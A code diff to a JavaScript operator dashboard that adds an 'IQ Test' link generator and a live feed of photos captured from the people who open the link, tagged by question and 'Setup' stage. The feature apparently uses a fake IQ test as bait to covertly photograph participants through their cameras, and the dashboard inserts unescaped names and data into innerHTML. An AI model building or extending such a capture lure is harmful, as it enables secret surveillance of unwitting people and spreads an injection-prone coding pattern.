@@ -9,10 +9,20 @@ const activeSessionsCount = document.getElementById('activeSessionsCount');
 const totalImagesCount = document.getElementById('totalImagesCount');
 const connectedUsersCount = document.getElementById('connectedUsersCount');
 
+// IQ Test elements
+const generateIQTestBtn = document.getElementById('generateIQTestBtn');
+const iqTestNameInput = document.getElementById('iqTestName');
+const iqLinkDisplay = document.getElementById('iqLinkDisplay');
+const generatedIQLink = document.getElementById('generatedIQLink');
+const copyIQLinkBtn = document.getElementById('copyIQLinkBtn');
+const iqSessionsList = document.getElementById('iqSessionsList');
+const iqPhotoFeed = document.getElementById('iqPhotoFeed');
+
 let ws = null;
 let totalImages = 0;
 let activeSessions = new Set();
 let connectedUsers = 0;
+let iqSessions = new Map(); // Store IQ test sessions
 
 function connectWebSocket() {
   ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
@@ -37,6 +47,12 @@ function connectWebSocket() {
       } else if (data.type === 'user_disconnected') {
         connectedUsers = Math.max(0, connectedUsers - 1);
         updateStatsDisplay();
+      } else if (data.type === 'iq_session_created') {
+        handleIQSessionCreated(data);
+      } else if (data.type === 'iq_photo_captured') {
+        handleIQPhotoCapture(data);
+      } else if (data.type === 'iq_test_completed') {
+        handleIQTestCompleted(data);
       }
     } catch (e) {
       console.error('Failed to parse message:', e);
@@ -169,6 +185,148 @@ copyLinkBtn.addEventListener('click', async () => {
     }, 2000);
   }
 });
+
+// IQ Test Link Generation
+generateIQTestBtn.addEventListener('click', () => {
+  const testName = iqTestNameInput.value.trim() || 'IQ Test Participant';
+  const sessionId = generateSessionId();
+  const baseUrl = location.protocol + '//' + location.host;
+  const link = `${baseUrl}/iqtest/${sessionId}`;
+  
+  generatedIQLink.textContent = link;
+  iqLinkDisplay.style.display = 'block';
+  
+  // Clear the test name input for next use
+  iqTestNameInput.value = '';
+  
+  // Send IQ test session creation to server
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({
+      type: 'create_iq_session',
+      sessionId: sessionId,
+      participantName: testName
+    }));
+  }
+});
+
+copyIQLinkBtn.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText(generatedIQLink.textContent);
+    copyIQLinkBtn.textContent = 'Copied!';
+    setTimeout(() => {
+      copyIQLinkBtn.textContent = 'Copy IQ Link';
+    }, 2000);
+  } catch (err) {
+    // Fallback for older browsers
+    const textArea = document.createElement('textarea');
+    textArea.value = generatedIQLink.textContent;
+    document.body.appendChild(textArea);
+    textArea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textArea);
+    copyIQLinkBtn.textContent = 'Copied!';
+    setTimeout(() => {
+      copyIQLinkBtn.textContent = 'Copy IQ Link';
+    }, 2000);
+  }
+});
+
+// IQ Test Handlers
+function handleIQSessionCreated(data) {
+  iqSessions.set(data.sessionId, {
+    id: data.sessionId,
+    participantName: data.participantName,
+    status: 'active',
+    created: Date.now(),
+    photoCount: 0
+  });
+  updateIQSessionsList();
+}
+
+function handleIQPhotoCapture(data) {
+  // Update session photo count
+  if (iqSessions.has(data.sessionId)) {
+    iqSessions.get(data.sessionId).photoCount++;
+    updateIQSessionsList();
+  }
+  
+  // Add photo to feed
+  const photoElement = createIQPhotoElement(data);
+  iqPhotoFeed.insertBefore(photoElement, iqPhotoFeed.firstChild);
+  
+  // Limit to 50 photos in feed
+  while (iqPhotoFeed.children.length > 50) {
+    iqPhotoFeed.removeChild(iqPhotoFeed.lastChild);
+  }
+}
+
+function handleIQTestCompleted(data) {
+  if (iqSessions.has(data.sessionId)) {
+    const session = iqSessions.get(data.sessionId);
+    session.status = 'completed';
+    session.score = data.score;
+    session.correctAnswers = data.correctAnswers;
+    session.totalQuestions = data.totalQuestions;
+    session.completedAt = Date.now();
+    updateIQSessionsList();
+  }
+}
+
+function updateIQSessionsList() {
+  if (iqSessions.size === 0) {
+    iqSessionsList.innerHTML = '<p style="color: #718096; text-align: center; padding: 2rem;">No active IQ test sessions</p>';
+    return;
+  }
+  
+  const sessionsArray = Array.from(iqSessions.values());
+  iqSessionsList.innerHTML = sessionsArray.map(session => createIQSessionCard(session)).join('');
+}
+
+function createIQSessionCard(session) {
+  const timeAgo = formatTimeAgo(session.created);
+  const statusClass = session.status === 'completed' ? 'completed' : 'active';
+  const scoreInfo = session.status === 'completed' 
+    ? `<div class="info-item"><span>📊</span><span>Score: ${session.score} (${session.correctAnswers}/${session.totalQuestions})</span></div>`
+    : '';
+  
+  return `
+    <div class="iq-session-card">
+      <div class="iq-session-header">
+        <div class="iq-session-name">🧠 ${session.participantName}</div>
+        <div class="iq-session-status ${statusClass}">${session.status}</div>
+      </div>
+      <div class="iq-session-info">
+        <div class="info-item"><span>🆔</span><span>${session.id.substring(0, 8)}...</span></div>
+        <div class="info-item"><span>⏰</span><span>${timeAgo}</span></div>
+        <div class="info-item"><span>📸</span><span>${session.photoCount} photos</span></div>
+        ${scoreInfo}
+      </div>
+    </div>
+  `;
+}
+
+function createIQPhotoElement(data) {
+  const div = document.createElement('div');
+  div.className = 'iq-photo-card';
+  
+  const session = iqSessions.get(data.sessionId);
+  const participantName = session ? session.participantName : 'Unknown';
+  const questionInfo = data.currentQuestion !== undefined 
+    ? `Question ${data.currentQuestion + 1}` 
+    : 'Setup';
+  
+  div.innerHTML = `
+    <img src="${data.photo}" alt="IQ Test Capture" style="width: 100%; height: 200px; object-fit: cover;">
+    <div class="iq-photo-meta">
+      <div class="participant">${participantName}</div>
+      <div class="photo-type">${data.photoType}</div>
+      <div class="time">${formatTime(data.timestamp)}</div>
+      <div class="question-info">${questionInfo}</div>
+    </div>
+  `;
+  
+  return div;
+}
 
 // Initialize connection
 connectWebSocket();
